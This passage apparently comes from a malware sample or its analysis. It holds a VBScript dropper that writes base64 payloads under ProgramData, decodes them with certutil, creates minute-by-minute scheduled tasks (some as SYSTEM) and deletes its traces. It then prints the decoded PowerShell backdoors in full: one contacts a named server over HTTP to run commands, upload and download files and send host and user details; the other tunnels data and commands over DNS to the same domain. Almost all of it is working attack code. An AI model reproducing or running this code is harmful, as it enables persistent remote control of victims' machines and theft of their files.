BZVCIgKyAkc2VuZGluZ0ZpbGVOYW1lc3NzOyANCiAJCSRzZW5kaW5nQnl0ZXMgPSAkZmlsZUJlZ2lubmluZyArICRzZW5kaW5nQnl0ZXM7IA0KIAkJJGZpbGVDaHVua0NvdW50cyA9IFtpbnRdJHNlbmRpbmdCeXRlcy5MZW5ndGggLyBbaW50XSRjaHVua19zaXplOyANCiAJCSRhY2tfbm8gPSAiMDAwIjsgDQogCQkkYWN0aW9uID0gIjIiOyANCiAJCSRidWxrID0gMDsgDQogCQkke2dsb2JhbDokcnVufSA9ICR0cnVlOyANCiAJCSR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAwOyANCiAJCVdoaWxlICgke2dsb2JhbDokcnVufSkgDQogCQl7IA0KIAkJCWlmICgke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9IC1ndCAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50X2xpbWl0c3NzfSkgeyBicmVhazsgfSANCiAJCQlTdGFydC1TbGVlcCAtbSA1MDsgDQogCQkJaWYgKCRjb3VudGVyc3NzIC1lcSAyNTApIHsgJGNvdW50ZXJzc3MgPSAwOyAkYnVsayArPSAyNTA7IH0gDQogCQkJaWYgKCRjb3VudGVyc3NzIC1sdCAxMCkgeyAkYWNrX25vID0gIjAwJCgkY291bnRlcnNzcykiOyB9IA0KIAkJCWVsc2VpZiAoJGNvdW50ZXJzc3MgLWx0IDEwMCkgeyAkYWNrX25vID0gIjAkKCRjb3VudGVyc3NzKSI7IH0gDQogCQkJZWxzZSB7ICRhY2tfbm8gPSAiJCgkY291bnRlcnNzcykiOyB9IA0KIAkJCSANCiAJCQlpZiAoJHNlbmRpbmdCeXRlcy5MZW5ndGggLWd0ICRjaHVua19zaXplKSANCiAJCQl7IA0KIAkJCQlpZiAoKCRzZW5kaW5nQnl0ZXMuTGVuZ3RoIC0gJGNodW5rX3NpemUgKiAoJGNvdW50ZXJzc3MgKyAkYnVsaykpIC1nZSAkY2h1bmtfc2l6ZSkgDQogCQkJCXsgDQogCQkJCQkkY3VycmVudENodW5rID0gJHNlbmRpbmdCeXRlcy5TdWJzdHJpbmcoJGNodW5rX3NpemUgKiAoJGNvdW50ZXJzc3MgKyAkYnVsayksICRjaHVua19zaXplKTsgDQogCQkJCX0gDQogCQkJCWVsc2VpZiAoKCRzZW5kaW5nQnl0ZXMuTGVuZ3RoIC0gJGNodW5rX3NpemUgKiAoJGNvdW50ZXJzc3MgKyAkYnVsaykpIC1ndCAwKSANCiAJCQkJeyANCiAJCQkJCSRjdXJyZW50Q2h1bmsgPSAkc2VuZGluZ0J5dGVzLlN1YnN0cmluZygkY2h1bmtfc2l6ZSAqICgkY291bnRlcnNzcyArICRidWxrKSwgKCRzZW5kaW5nQnl0ZXMuTGVuZ3RoIC0gJGNodW5rX3NpemUgKiAoJGNvdW50ZXJzc3MgKyAkYnVsaykpKTsgDQogCQkJCX0gDQogCQkJCWVsc2UgDQogCQkJCXsgDQogCQkJCQkkY3VycmVudENodW5rID0gImJXVjBZVFpXNWsiOyANCiAJCQkJCSR7Z2xvYmFsOiRydW59ID0gJGZhbHNlOyANCiAJCQkJCVJlbW92ZS1JdGVtIC1wYXRoICR0bXBBZGRyZXNzIC1Gb3JjZTsgDQogCQkJCX0gDQogCQkJfSANCiAJCQllbHNlIA0KIAkJCXsgDQogCQkJCSRjdXJyZW50Q2h1bmsgPSAkc2VuZGluZ0J5dGVzOyANCiAJCQl9IA0KIAkJCSRmaWxlTmFtZVNlbmRpbmdUbXBzc3MgPSAoU3BsaXQtUGF0aCAkdG1wQWRkcmVzcyAtTGVhZikgKyAiKiIgfCAlIHsgcmVzb2x2ZXIgJF8gfTsgDQogCQkJJGxhc3RBZGRyZXNzID0gQWRyR2VuICRhY2tfbm8gJGFjdGlvbiAkY3VycmVudENodW5rICRmaWxlTmFtZVNlbmRpbmdUbXBzc3MgInMiIA0KIAkJCVdyaXRlLUhvc3QgIiQoJGN1cnJlbnRDaHVuaylgdCQoJGxhc3RBZGRyZXNzKSIgDQogCQkJdHJ5IA0KIAkJCXsgDQogCQkJCSRyZXN1bHRUbXAgPSBbU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0QWRkcmVzc2VzKCRsYXN0QWRkcmVzcyk7IA0KIAkJCX0gDQogCQkJY2F0Y2ggeyBXcml0ZS1Ib3N0ICJleGNlcHRvbiBvY2N1cmVkISI7ICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ICsgMTsgY29udGludWU7IH0gDQogCQkJIA0KIAkJCWlmICgkcmVzdWx0VG1wIC1lcSAkbnVsbCkgeyAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ID0gJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSArIDE7Y29udGludWUgfSANCiAJCQkkcmVzdWx0ID0gJHJlc3VsdFRtcFswXS5JUEFkZHJlc3NUb1N0cmluZzsgDQogCQkJJHJlc3VsdF9zcGlsaXRlZHNzcyA9ICRyZXN1bHQuU3BsaXQoJy4nKTsgDQogCQkJV3JpdGUtSG9zdCAiJCgkY291bnRlcnNzcyk6JCgkcmVzdWx0X3NwaWxpdGVkc3NzWzNdKWB0c2F2ZWluZ19tb2RlOiAkKCRzYXZlaW5nX21vb2Rzc3MpYHQgICAkKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMF0pICQoJHJlc3VsdF9zcGlsaXRlZHNzc1sxXSkgJCgkcmVzdWx0X3NwaWxpdGVkc3NzWzJdKSIgDQogCQkJIA0KIAkJCWlmICgoJHJlc3VsdF9zcGlsaXRlZHNzc1swXSAtZXEgMSkgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1sxXSAtZXEgMikgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1syXSAtZXEgMykpIA0KIAkJCXsgDQogCQkJCSRjb3VudGVyc3NzID0gW2ludF0kcmVzdWx0X3NwaWxpdGVkc3NzWzNdOyANCiAJCQl9IA0KIAkJCSANCiAJCQlpZiAoKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMF0gLWVxIDExKSAtYW5kICgkcmVzdWx0X3NwaWxpdGVkc3NzWzFdIC1lcSAyNCkgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1syXSAtZXEgMjM3KSAtYW5kICgkcmVzdWx0X3NwaWxpdGVkc3NzWzNdIC1lcSAxMTApKSAjIGtpbGwgdGhpcyBwcm9jZXNzIA0KIAkJCXsgDQogCQkJCSRidWxrID0gMCANCiAJCQkJJHtnbG9iYWw6JHJ1bn0gPSAkZmFsc2U7IA0KIAkJCQkke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ID0gJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSArIDM7IA0KIAkJCQlkZWwgJHRtcEFkZHJlc3M7IA0KIAkJCX0gDQogCQl9IA0KIAl9IA0KIH0gDQogIA0KIGZ1bmN0aW9uIHNsYWJlciANCiB7IA0KIAlQYXJhbSAoJGZpbGVQYXRoKSANCiAJaWYgKChHZXQtSXRlbSAkZmlsZVBhdGgpLmxlbmd0aCAtZ3QgNjAwa2IpIA0KIAl7IA0KIAkJInJlc3VsdCBzaXplIGV4Y2VlZGVkIHRoZSBtYXhpbXVtIHNpemUgYW5kIGl0IGRlbGV0ZWQiIHwgU2V0LUNvbnRlbnQgJGZpbGVQYXRoOyANCiAJfSANCiAJJGZpbGUgPSBHZXQtQ29udGVudCAkZmlsZVBhdGggLUVuY29kaW5nIEJ5dGU7IA0KIAkkZW5jb2RlZCA9IHJlc29sdmVyKCRmaWxlKTsgDQogCXJldHVybiAkZW5jb2RlZDsgDQogfSANCiBmdW5jdGlvbiByZXNvbHZlciAoJGJ5dGVfYXJyYXkpIA0KIHsgDQogCSRjbnQgPSAwOyANCiAJJHAxID0gIiI7IA0KIAkkcDIgPSAiIjsgDQogCWZvciAoJGkgPSAwOyAkaSAtbHQgJGJ5dGVfYXJyYXkuTGVuZ3RoOyAkaSsrKSANCiAJeyANCiAJCWlmICgkY250IC1lcSAzMCkgDQogCQl7IA0KIAkJCSRjbnQgPSAwOyANCiAJCQkkcmVzICs9ICgkcDEgKyAkcDIpOyANCiAJCQkkcDEgPSAiIjsgJHAyID0gIiI7IA0KIAkJfSANCiAJCSR0bXAgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRieXRlX2FycmF5WyRpXSkuUmVwbGFjZSgiLSIsICIiKTsgDQogCQkkcDEgKz0gJHRtcFswXTsgDQogCQkkcDIgKz0gJHRtcFsxXTsgDQogCQkkY250Kys7IA0KIAl9IA0KIAkkcmVzICs9ICgkcDEgKyAkcDIpOyANCiAJcmV0dXJuICRyZXM7IA0KIH0gDQogZnVuY3Rpb24gcHJvY2Vzc29yIA0KIHsgDQogCSRmaWxlc19saXN0ID0gQChHZXQtQ2hpbGRJdGVtIC1QYXRoICR7Z2xvYmFsOiRyZWNlaXZlX2JveH0gfCBXaGVyZS1PYmplY3QgeyAhJF8uUFNJc0NvbnRhaW5lciB9KTsgDQogCWlmICgkZmlsZXNfbGlzdCAtbmUgJG51bGwpIA0KIAl7IA0KIAkJJHRtcEFkZHJlc3MgPSAke2dsb2JhbDokcmVjZWl2ZV9ib3h9ICsgIlwiICsgJGZpbGVzX2xpc3RbMF07IA0KIAkJJG5ld1RtcEFkZHJlc3Mzc3NzID0gJHRtcEFkZHJlc3MgLXJlcGxhY2UgInJlY2VpdmVib3giLCAic2VuZGJveCI7IA0KIAkJIA0KIAkJaWYgKCR0bXBBZGRyZXNzLkVuZHNXaXRoKCIwIikpIA0KIAkJeyANCiAJCQkkZmlsZV9jb250ZW50ID0gR2V0LUNvbnRlbnQgJHRtcEFkZHJlc3MgfCA/IHsgJF8udHJpbSgpIC1uZSAiIiB9OyANCiAJCQkkb3V0cHV0X3BhdGggPSAke2dsb2JhbDokc2VuZF9ib3h9ICsgIlwiICsgJGZpbGVzX2xpc3RbMF07IA0KIAkJCSRmaWxlX2NvbnRlbnQgPSAkZmlsZV9jb250ZW50LlRyaW0oKTsgDQogCQkJKCRmaWxlX2NvbnRlbnQucmVwbGFjZSgiJiIsICI7IikgKyAiIDI+JjEiKSB8IGlleCB8IE91dC1GaWxlICRvdXRwdXRfcGF0aCAtRW5jb2RpbmcgVVRGOCANCiAJCQlpZiAoVGVzdC1QYXRoIC1QYXRoICR0bXBBZGRyZXNzKSANCiAJCQl7IA0KIAkJCQlSZW1vdmUtSXRlbSAtcGF0aCAkdG1wQWRkcmVzczsgDQogCQkJfSANCiAJCX0gDQogCQllbHNlaWYgKCR0bXBBZGRyZXNzLkVuZHNXaXRoKCIxIikpIA0KIAkJeyANCiAJCQkkZmlsZUFkZHIyRG93biA9IEdldC1Db250ZW50ICR0bXBBZGRyZXNzIHwgPyB7ICRfLnRyaW0oKSAtbmUgIiIgfSB8ICV7ICRfLlJlcGxhY2UoImAwIiwgIiIpLlRyaW0oKSB9IA0KIAkJCWlmIChUZXN0LVBhdGggLVBhdGggJGZpbGVBZGRyMkRvd24pIA0KIAkJCXsgDQogCQkJCSRvdXRwdXRfcGF0aCA9ICR7Z2xvYmFsOiRzZW5kX2JveH0gKyAiXCIgKyAkZmlsZXNfbGlzdFswXTsgDQogCQkJCUNvcHktSXRlbSAtcGF0aCAkZmlsZUFkZHIyRG93biAtZGVzdGluYXRpb24gJG91dHB1dF9wYXRoIC1Gb3JjZTsgDQogCQkJfSANCiAJCQllbHNlIA0KIAkJCXsgDQogCQkJCSJGaWxlIG5vdCBleGlzdCIgfCBTZXQtQ29udGVudCAkbmV3VG1wQWRkcmVzczNzc3M7IA0KIAkJCX0gDQogCQkJaWYgKFRlc3QtUGF0aCAtUGF0aCAkdG1wQWRkcmVzcykgDQogCQkJeyANCiAJCQkJUmVtb3ZlLUl0ZW0gLXBhdGggJHRtcEFkZHJlc3M7IA0KIAkJCX0gDQogCQl9IA0KIAkJZWxzZWlmICgkdG1wQWRkcmVzcy5FbmRzV2l0aCgiMiIpKSANCiAJCXsgDQogCQkJJG5ld1RtcEFkZHJlc3MyID0gJHRtcEFkZHJlc3MgLXJlcGxhY2UgInJlY2VpdmVib3giLCAiZG9uZSI7IA0KIAkJCU1vdmUtSXRlbSAtcGF0aCAkdG1wQWRkcmVzcyAtZGVzdGluYXRpb24gJG5ld1RtcEFkZHJlc3MyIC1Gb3JjZTsgDQogCQkJaWYgKFRlc3QtUGF0aCAtUGF0aCAkbmV3VG1wQWRkcmVzczIpIA0KIAkJCXsgDQogCQkJCSgiMjAwPD4iICsgJG5ld1RtcEFkZHJlc3MyKSB8IFNldC1Db250ZW50ICRuZXdUbXBBZGRyZXNzM3NzczsgDQogCQkJCVJlbW92ZS1JdGVtIC1wYXRoICR0bXBBZGRyZXNzOyANCiAJCQl9IA0KIAkJfSANCiAJCWVsc2VpZiAoJHRtcEFkZHJlc3MuRW5kc1dpdGgoIjMiKSkgDQogCQl7IA0KIAkJCWdldEluZm8gfCBPdXQtRmlsZSAtRW5jb2RpbmcgJ1VURjgnIC1GaWxlUGF0aCAiJCgke2dsb2JhbDokc2VuZF9ib3h9KVwwMGluZiI7IA0KIAkJCWlmIChUZXN0LVBhdGggLVBhdGggJHRtcEFkZHJlc3MpIA0KIAkJCXsgDQogCQkJCVJlbW92ZS1JdGVtIC1wYXRoICR0bXBBZGRyZXNzOyANCiAJCQl9IA0KIAkJfSANCiAJfSANCiB9IA0KIGZ1bmN0aW9uIGdldEluZm8gDQogeyANCiAJJGlwID0gQCgpOyANCiAJR2V0LVdtaU9iamVjdCB3aW4zMl9uZXR3b3JrYWRhcHRlcmNvbmZpZ3VyYXRpb24gfCA/IHsgJF8uSVBBZGRyZXNzIC1uZSAkbnVsbCB9IHwgU29ydC1PYmplY3QgSVBBZGRyZXNzIC1VbmlxdWUgfCAlIHsgJGlwICs9ICRfLklQQWRkcmVzcyB9OyANCiAJJHdob2FtID0gIiQoJGVudjpDT01QVVRFUk5BTUUpLyQoJGVudjpVU0VSTkFNRSkiOyANCiAJcmV0dXJuICIkKCR7Z2xvYmFsOiRhaWRzc3N9KTw+JCgkd2hvYW0pPD4kKChbc3RyaW5nXTo6Sm9pbigiLCIsICRpcCkpLlRyaW0oKSk8PiR7Z2xvYmFsOiRteVBhdGhzc3N9IjsgDQogfSANCiBpZiAoKEdldC1XbWlPYmplY3QgV2luMzJfUHJvY2VzcyAtRmlsdGVyICgiQ29tbWFuZExpbmUgTElLRSAnJSIrJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuTmFtZS5UcmltKCkrIiUnIikpLmxlbmd0aCAtbHQgMTApIHsgDQogCSR7Z2xvYmFsOiRyb290X3BhdGh9ID0gJGVudjpBUFBEQVRBICsgIlxXaW5kb3dzXExpYnJhcmllc1wiICsgJHtnbG9iYWw6JGFpZHNzc307IA0KIAkke2dsb2JhbDokcmVjZWl2ZV9ib3h9ID0gJHtnbG9iYWw6JHJvb3RfcGF0aH0gKyAiXHJlY2VpdmVib3giOyANCiAJJHtnbG9iYWw6JHNlbmRfYm94fSA9ICR7Z2xvYmFsOiRyb290X3BhdGh9ICsgIlxzZW5kYm94IjsgDQogCSR7Z2xvYmFsOiRkb25lX2JveH0gPSAke2dsb2JhbDokcm9vdF9wYXRofSArICJcZG9uZSI7IA0KIAlpZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICR7Z2xvYmFsOiRyb290X3BhdGh9KSAtb3IgLW5vdCAoVGVzdC1QYXRoIC1QYXRoICR7Z2xvYmFsOiRzZW5kX2JveH0pKSANCiAJeyANCiAJCW1kICR7Z2xvYmFsOiRyb290X3BhdGh9OyANCiAJCW1kICR7Z2xvYmFsOiRzZW5kX2JveH07IA0KIAkJbWQgJHtnbG9iYWw6JHJlY2VpdmVfYm94fTsgDQogCQltZCAke2dsb2JhbDokZG9uZV9ib3h9OyANCiAJCWdldEluZm87IA0KIAl9IA0KIAlyZWNlaXZlOyANCiAJcHJvY2Vzc29yOyANCiAJc2VuZDsgDQogfQ=="
	outFile3 = "C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base"
	Set objFile3 = objFSO.CreateTextFile(outFile3,True)
	objFile3.Write  code3
	objFile3.Close
End if
if Not objFso.FileExists("C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat") Then
		code4="@schtasks /create /F /sc minute /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs""""NEXTLINE@schtasks /create /F /sc minute /RU ""SYSTEM"" /mo 1 /tn ""\UpdateTasks\JavaUpdates"" /tr ""wscript /b ""C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs"""""
		code4 = Replace(code4, "NEXTLINE", vbCrLf)
		outFile4 = "C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat"
		Set objFile4 = objFSO.CreateTextFile(outFile4,True)
		objFile4.Write  code4
		objFile4.Close
		oShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.ps1", 0,false
		oShell.run "cmd.exe /C certutil -f  -decode C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.ps1", 0,false
		oShell.run "cmd.exe /C C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", 0,false
		oShell.run "cmd.exe /C wscript  /b C:\ProgramData\Windows\Microsoft\java\GoogleUpdateschecker.vbs", 0,false
		WScript.Sleep(5000)
		oShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\cUpdateCheckers.bat", 0,false		
		oShell.run "cmd.exe /C del C:\ProgramData\Windows\Microsoft\java\*.base", 0,false
End If

######## code2 decodes to:
if ((Get-WmiObject Win32_Process -Filter ("CommandLine LIKE '%"+$MyInvocation.MyCommand.Name.Trim()+"%'")).length -lt 10) { 
 ${global:$wc} = new-object system.net.WebClient 
 ${global:$wc}.proxy = [System.Net.WebProxy]::GetDefaultProxy() 
 $srvr = "http://" + [System.Net.Dns]::GetHostAddresses("www.anyportals.com") +"/update_wapp2.aspx" 
 $ip = Get-WmiObject -query "select * from Win32_NetworkAdapterConfiguration where IPEnabled = $true" | %{$_.IPaddress} 
 ${global:$aid} = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID | %{$_.replace('-','')} | %{$_ + "124524136521"} | %{$_.substring(0,12)} 
 ${global:$rPath} = $env:ProgramData + "\Windows\Microsoft\Java\" + ${global:$aid} 
 function sndr($fname, $cnt){ 
 	$adr = adrCt "$fname" "2" 
 	write-host $adr 
 	write-host $cnt 
 	${global:$wc}.UploadString($adr, [System.Convert]::ToBase64String([System.Text.Encoding]::Default.GetBytes($cnt))) 
 } 
 function adrCt($ridIn, $ac){ 
 	$cr = @() 
 	$dar = @() 
 	$dar = -join (Get-Random -InputObject (0 .. 9) -Count 15) 
 	$cr = Get-Random -InputObject (0 .. 9) -Count 2 
 	$dar = $dar.Insert($cr[0], $ridIn.Trim()).Insert(($cr[1]), ${global:$aid}) 
 	$adr = "$($srvr)?version=$($dar)5$($ac)7$($cr[0])$($cr[1])" 
 	return $adr 
 } 
 if (-not (Test-Path -Path ${global:$rPath})) 
 { 
 	New-Item -ItemType Directory -Path ${global:$rPath}; 
 	sndr '12121212121' "$($env:COMPUTERNAME)/$($env:USERNAME)<>$($ip)"; 
 } 
 $adr = adrCt "24351243510" "0" 
 $rid = ${global:$wc}.DownloadString($adr) 
 if ($rid){ 
 	if ($rid.length -eq 11){ 
 		$adr = adrCt "$rid" "1" 
 		$r = ${global:$wc}.DownloadString($adr) 
 		$rcnt = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($r)) 
 		$adr = adrCt "$rid" "3" 
 		${global:$wc}.DownloadString($adr) 
 		if ($rid.EndsWith("0")){ 
 			$rcnt = $rcnt | ? { $_.trim() -ne "" } 
 			$res += $rcnt.Split("&") | foreach-object { $_ | iex | Out-String } 
 			sndr $rid $res 
 		} 
 		elseif ($rid.EndsWith("1")){ 
 			$adr = $rcnt.Trim() 
 			if (Test-Path -Path $adr) 
 			{ 
 				$adrS = adrCt "$rid" "4" 
 				${global:$wc}.UploadFile($adrS, $adr) 
 			} 
 			else 
 			{ 
 				sndr $rid "404" 
 			} 
 		} 
 		elseif ($rid.EndsWith("2")){ 
 			if(-not(Test-Path "${global:$rPath}\files\")) {md "${global:$rPath}\files\";} 
 			$savAdr = "${global:$rPath}\files\"+$rcnt.trim(); 
 			$adrS = adrCt "$rid" "5" 
 			${global:$wc}.DownloadFile($adrS, $savAdr) 
 			sndr $rid "200<>$savAdr" 
 		} 
 	} 
 } 
 }

######## code3 decodes to:
${global:$address} = "anyportals.com"; 
 ${global:$aidsss} = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID | %{$_.replace('-','')} | %{$_ + "124524136521"} | %{$_.substring(0,12)} 
 ${global:$myPathsss} = $MyInvocation.MyCommand.Path; 
 ${global:$exception_countersss} = 0; 
 ${global:$exception_count_limitsss} = 2; 
 function AdrGen 
 { 
 	param ($part_nosss, $actionsss, $datasss, $file_namesss, $sender_or_receiversss) 
 	$extra_randsss = -join ((48 .. 57)+(65 .. 70) | Get-Random  -Count (%{ Get-Random -InputObject (1 .. 7) }) | %{ [char]$_ }); 
 	$ctrl_random_placesss = Get-Random -InputObject (0 .. 9) -Count 2; 
 	$control_data_and_randsss = ${global:$aidsss}.Insert(($ctrl_random_placesss[1]), $actionsss).Insert($ctrl_random_placesss[0], $part_nosss); 
 	if ($sender_or_receiversss -eq "s") 
 	{ 
 		return "$($control_data_and_randsss)$($extra_randsss)A$($ctrl_random_placesss[0])$($ctrl_random_placesss[1])7.$datasss.$file_namesss.${global:$address}"; 
 	} 
 	else 
 	{ 
 		return "$($control_data_and_randsss)$($extra_randsss)A$($ctrl_random_placesss[0])$($ctrl_random_placesss[1])7.$(${global:$address})"; 
 	} 
 } 
 function receive 
 { 
 	$saveing_moodsss = $false; 
 	$countersss = 0; 
 	$save_path = ${global:$receive_box} + "\"; 
 	$fetched_bytessss = @(); 
 	$req_no = "000"; 
 	$action = "0"; 
 	${global:$run} = $true; 
 	${global:$exception_countersss} = 0; 
 	While (${global:$run}) 
 	{ 
 		if (${global:$exception_countersss} -gt ${global:$exception_count_limitsss}) { break } 
 		Start-Sleep -m 50; 
 		if ($countersss -lt 10) { $req_no = "00$($countersss)"; } 
 		elseif ($countersss -lt 100) { $req_no = "0$($countersss)"; } 
 		else { $req_no = "$($countersss)"; } 
 		$lastAddress = AdrGen $req_no $action "" "" "r" 
 		try 
 		{ 
 			Write-Host $lastAddress; 
 			$resultTmp = [System.Net.Dns]::GetHostAddresses($lastAddress); 
 			Write-Host $resultTmp; 
 		} 
 		catch [Exception] 
 		{ 
 			echo $_.Exception.GetType().FullName, $_.Exception.Message; Write-Host "excepton occured!"; ${global:$exception_countersss} = ${global:$exception_countersss} + 1; continue; 
 		} 
 		if ($resultTmp -eq $null) 
 		{ 
 			${global:$exception_countersss} = ${global:$exception_countersss} + 1; 
 			continue; 
 		} 
 		$result = $resultTmp[0].IPAddressToString; 
 		$result_spilitedsss = $result.Split('.'); 
 		Write-Host "$($countersss):$($result_spilitedsss[3])`tsaveing_mode: $($saveing_moodsss)`t   $($result_spilitedsss[0]) $($result_spilitedsss[1]) $($result_spilitedsss[2])" 
 		if (($result_spilitedsss[0] -eq 1) -and ($result_spilitedsss[1] -eq 2) -and ($result_spilitedsss[2] -eq 3)) 
 		{ 
 			$saveing_moodsss = $false; 
 			$action = "0"; 
 			$len = $fetched_bytessss.Length 
 			if ($fetched_bytessss[$len-1] -eq 0 -and $fetched_bytessss[$len-2] -eq 0) 
 			{ 
 				$fetchTmp = $fetched_bytessss[0 .. ($len - 3)]; 
 			} 
 			elseif ($fetched_bytessss[$len - 1] -eq 0) 
 			{ 
 				$fetchTmp = $fetched_bytessss[0 .. ($len - 2)]; 
 			} 
 			else 
 			{ 
 				$fetchTmp = $fetched_bytessss; 
 			} 
 			[System.IO.File]::WriteAllBytes($save_path, $fetchTmp); 
 			$fetched_bytessss = @(); 
 			$fetchTmp = @(); 
 			$countersss = 0; 
 			${global:$run} = $false; 
 		} 
 		if ($saveing_moodsss) 
 		{ 
 			if ($countersss -gt 250) { $countersss = 0; } 
 			if ($countersss -eq $result_spilitedsss[3]) 
 			{ 
 				$fetched_bytessss += $result_spilitedsss[0]; 
 				$fetched_bytessss += $result_spilitedsss[1]; 
 				$fetched_bytessss += $result_spilitedsss[2]; 
 				$countersss = $countersss + 3; 
 			} 
 		} 
 		if (($result_spilitedsss[0] -eq 24) -and ($result_spilitedsss[1] -eq 125)) 
 		{ 
 			$save_path += $result_spilitedsss[2] + "" + $result_spilitedsss[3]; 
 			$saveing_moodsss = $true; 
 			$action = "1"; 
 			$countersss = 0; 
 		} 
 		if (($result_spilitedsss[0] -eq 11) -and ($result_spilitedsss[1] -eq 24) -and ($result_spilitedsss[2] -eq 237) -and ($result_spilitedsss[3] -eq 110)) # kill this process 
 		{ 
 			${global:$run} = $false; 
 			${global:$exception_countersss} = ${global:$exception_countersss} + 1; 
 		} 
 	} 
 	Start-Sleep -s 1; 
 } 
 function send 
 { 
 	$countersss = 0; 
 	$files_list = @(Get-ChildItem -Path ${global:$send_box} | Where-Object { !$_.PSIsContainer }); 
 	if ($files_list -ne $null) 
 	{ 
 		$tmpAddress = ${global:$send_box} + "\" + $files_list[0]; 
 		$sendingBytes = slaber $tmpAddress; 
 		if ([int]$sendingBytes.Length -le 0) 
 		{ 
 			Remove-Item -Path $tmpAddress; 
 			return; 
 		} 
 		$chunk_size = 60; 
 		$sendingFileNamesss = "*" * 54; 
 		$sendingFileNamesss = Split-Path $tmpAddress -Leaf | % { $sendingFileNamesss.Insert(0, $_) } | % { $_.Insert(6, $sendingBytes.Length) } | %{$_[0..26] -join ""}; 
 		$sendingFileNamesss = -join ($sendingFileNamesss | % { resolver $_ }) 
 		$fileBeginning = "bWV0YT" + $sendingFileNamesss; 
 		$sendingBytes = $fileBeginning + $sendingBytes; 
 		$fileChunkCounts = [int]$sendingBytes.Length / [int]$chunk_size; 
 		$ack_no = "000"; 
 		$action = "2"; 
 		$bulk = 0; 
 		${global:$run} = $true; 
 		${global:$exception_countersss} = 0; 
 		While (${global:$run}) 
 		{ 
 			if (${global:$exception_countersss} -gt ${global:$exception_count_limitsss}) { break; } 
 			Start-Sleep -m 50; 
 			if ($countersss -eq 250) { $countersss = 0; $bulk += 250; } 
 			if ($countersss -lt 10) { $ack_no = "00$($countersss)"; } 
 			elseif ($countersss -lt 100) { $ack_no = "0$($countersss)"; } 
 			else { $ack_no = "$($countersss)"; } 
 			 
 			if ($sendingBytes.Length -gt $chunk_size) 
 			{ 
 				if (($sendingBytes.Length - $chunk_size * ($countersss + $bulk)) -ge $chunk_size) 
 				{ 
 					$currentChunk = $sendingBytes.Substring($chunk_size * ($countersss + $bulk), $chunk_size); 
 				} 
 				elseif (($sendingBytes.Length - $chunk_size * ($countersss + $bulk)) -gt 0) 
 				{ 
 					$currentChunk = $sendingBytes.Substring($chunk_size * ($countersss + $bulk), ($sendingBytes.Length - $chunk_size * ($countersss + $bulk))); 
 				} 
 				else 
 				{ 
 					$currentChunk = "bWV0YTZW5k"; 
 					${global:$run} = $false; 
 					Remove-Item -path $tmpAddress -Force; 
 				} 
 			} 
 			else 
 			{ 
 				$currentChunk = $sendingBytes; 
 			} 
 			$fileNameSendingTmpsss = (Split-Path $tmpAddress -Leaf) + "*" | % { resolver $_ }; 
 			$lastAddress = AdrGen $ack_no $action $currentChunk $fileNameSendingTmpsss "s" 
 			Write-Host "$($currentChunk)`t$($lastAddress)" 
 			try 
 			{ 
 				$resultTmp = [System.Net.Dns]::GetHostAddresses($lastAddress); 
 			} 
 			catch { Write-Host "excepton occured!"; ${global:$exception_countersss} = ${global:$exception_countersss} + 1; continue; } 
 			 
 			if ($resultTmp -eq $null) { ${global:$exception_countersss} = ${global:$exception_countersss} + 1;continue } 
 			$result = $resultTmp[0].IPAddressToString; 
 			$result_spilitedsss = $result.Split('.'); 
 			Write-Host "$($countersss):$($result_spilitedsss[3])`tsaveing_mode: $($saveing_moodsss)`t   $($result_spilitedsss[0]) $($result_spilitedsss[1]) $($result_spilitedsss[2])" 
 			 
 			if (($result_spilitedsss[0] -eq 1) -and ($result_spilitedsss[1] -eq 2) -and ($result_spilitedsss[2] -eq 3)) 
 			{ 
 				$countersss = [int]$result_spilitedsss[3]; 
 			} 
 			 
 			if (($result_spilitedsss[0] -eq 11) -and ($result_spilitedsss[1] -eq 24) -and ($result_spilitedsss[2] -eq 237) -and ($result_spilitedsss[3] -eq 110)) # kill this process 
 			{ 
 				$bulk = 0 
 				${global:$run} = $false; 
 				${global:$exception_countersss} = ${global:$exception_countersss} + 3; 
 				del $tmpAddress; 
 			} 
 		} 
 	} 
 } 
  
 function slaber 
 { 
 	Param ($filePath) 
 	if ((Get-Item $filePath).length -gt 600kb) 
 	{ 
 		"result size exceeded the maximum size and it deleted" | Set-Content $filePath; 
 	} 
 	$file = Get-Content $filePath -Encoding Byte; 
 	$encoded = resolver($file); 
 	return $encoded; 
 } 
 function resolver ($byte_array) 
 { 
 	$cnt = 0; 
 	$p1 = ""; 
 	$p2 = ""; 
 	for ($i = 0; $i -lt $byte_array.Length; $i++) 
 	{ 
